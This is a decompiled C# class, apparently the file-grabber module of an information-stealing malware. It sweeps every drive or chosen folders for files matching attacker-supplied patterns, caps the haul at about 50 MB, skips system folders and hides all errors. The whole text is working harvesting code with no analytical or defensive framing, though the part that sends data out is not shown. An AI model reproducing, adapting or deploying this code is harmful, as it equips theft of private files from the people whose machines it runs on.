using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

// Token: 0x02000018 RID: 24
public static class FileSearcher
{
	// Token: 0x06000099 RID: 153 RVA: 0x000078C0 File Offset: 0x00005AC0
	public static List<ScannedFile> Search(IEnumerable<string> patterns)
	{
		List<ScannedFile> list = new List<ScannedFile>();
		try
		{
			long num = 0L;
			foreach (string text in patterns)
			{
				if (num >= 52428800L)
				{
					break;
				}
				try
				{
					string[] array = text.Split(new string[]
					{
						new string(new char[]
						{
							'|'
						})
					}, StringSplitOptions.RemoveEmptyEntries);
					if (array != null && array.Length > 2)
					{
						string text2 = Environment.ExpandEnvironmentVariables(array[0]);
						string[] searchPatterns = array[1].Split(new string[]
						{
							new string(new char[]
							{
								','
							})
						}, StringSplitOptions.RemoveEmptyEntries);
						string value = array[2];
						long num2 = 3097152L;
						if (array.Length > 3)
						{
							num2 = Convert.ToInt64(array[3]);
						}
						if (text2 == "%DSK_23%")
						{
							foreach (string rootPath in Environment.GetLogicalDrives())
							{
								try
								{
									foreach (string text3 in FileSearcher.GetFiles(rootPath, (SearchOption)Convert.ToInt32(value), searchPatterns))
									{
										try
										{
											FileInfo fileInfo = new FileInfo(text3);
											if (fileInfo.Length > 0L && fileInfo.Length <= num2 && num < 52428800L)
											{
												string[] array2 = fileInfo.Directory.FullName.Split(new string[]
												{
													new string(new char[]
													{
														':',
														'\\'
													})
												}, StringSplitOptions.RemoveEmptyEntries);
												list.Add(new ScannedFile(fileInfo.FullName)
												{
													DirOfFile = ((array2 != null && array2.Length > 1) ? array2[1] : string.Empty),
													PathOfFile = text3
												});
												num += fileInfo.Length;
											}
										}
										catch
										{
										}
									}
								}
								catch
								{
								}
							}
						}
						else
						{
							foreach (string text4 in FileSearcher.GetFiles(text2, (SearchOption)Convert.ToInt32(value), searchPatterns))
							{
								try
								{
									FileInfo fileInfo2 = new FileInfo(text4);
									if (fileInfo2.Length > 0L && fileInfo2.Length <= num2 && num < 52428800L)
									{
										string[] array3 = fileInfo2.Directory.FullName.Split(new string[]
										{
											new string(new char[]
											{
												':',
												'\\'
											})
										}, StringSplitOptions.RemoveEmptyEntries);
										list.Add(new ScannedFile(fileInfo2.FullName)
										{
											DirOfFile = ((array3 != null && array3.Length > 1) ? array3[1] : string.Empty),
											PathOfFile = text4
										});
										num += fileInfo2.Length;
									}
								}
								catch (Exception)
								{
								}
							}
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x0600009A RID: 154 RVA: 0x00007C68 File Offset: 0x00005E68
	public static IEnumerable<string> GetFiles(string rootPath, SearchOption searchOption, string[] searchPatterns)
	{
		List<string> list = new List<string>
		{
			"\\Windows\\",
			"\\Program Files\\",
			"\\Program Files (x86)\\",
			"\\Program Data\\"
		};
		IEnumerable<string> enumerable = Enumerable.Empty<string>();
		if (searchOption == SearchOption.AllDirectories)
		{
			try
			{
				foreach (string text in Directory.EnumerateDirectories(rootPath))
				{
					if (list != null && list.Any<string>())
					{
						bool flag = false;
						foreach (string value in list)
						{
							if (text.Contains(value))
							{
								flag = true;
								break;
							}
						}
						if (flag)
						{
							continue;
						}
					}
					enumerable = enumerable.Concat(FileSearcher.GetFiles(text, searchOption, searchPatterns));
				}
			}
			catch
			{
			}
		}
		foreach (string searchPattern in searchPatterns)
		{
			try
			{
				enumerable = enumerable.Concat(Directory.GetFiles(rootPath, searchPattern));
			}
			catch
			{
			}
		}
		return enumerable;
	}
}
